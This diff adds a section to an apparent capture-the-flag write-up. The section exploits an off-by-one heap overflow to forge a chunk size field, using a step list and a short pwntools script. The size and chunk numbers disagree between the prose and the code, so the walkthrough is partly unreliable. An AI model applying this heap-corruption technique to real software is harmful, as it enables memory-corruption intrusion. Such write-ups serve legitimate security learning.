@@ -172,4 +172,34 @@ sh.interactive()
 
 13. Nice! Now let's move our interest to the **Off-One-Byte (OOB)** bug we found earlier.
 14. To make it works, let's delete the chunk at index 0 first, then starts allocating 3 chunks adjacently.
-15. All of this 
+15. To make sure the size fits well for **/bin/sh** strings and **libc.sym.system**, let's allocate for **0x38** --> 0x40 as it's size field.
+
+### EXPLOITING OOB BUG
+
+- So the flow is quite simple here, we need to allocate 3 chunks adjacently.
+- Then using the OOB bug to overflow from chunk 0 to it's next chunk (chunk 1), so chunk 1 size_field shallc change to whatever we want, for example we're gonna set the size field to 0x81.
+
+> FLOW
+
+```
+delete chunk 0 (we want to remove the previously allocated size which we use to leak the libc address).
+allocate 0x38 chunk with contents fills it up. (should be stored at index 0)
+allocate 0x38 chunk with contents fills it up. (should be stored at index 1)
+allocate 0x38 chunk with contents fills it up. (should be stored at index 2)
+edit chunk for index 0 (triggering the OOB bug) --> gonna make a fake size field for chunk 2.
+```
+
+> SCRIPT
+
+```py
+delete(0) # remove data at chunk 0
+make(0x28, b'X' * 0x28) # allocate new data at chunk 0
+make(0x28, b'Y' * 0x28) # allocate new data at chunk 1
+make(0x28, b'Z' * 0x28) # allocate new data at chunk 2
+
+edit(0, b'M' * 0x28 + p8(0x81)) # overflow chunk 0 until and overlap the size field of chunk 2 to 0x81
+```
+
+> RESULT
+
+
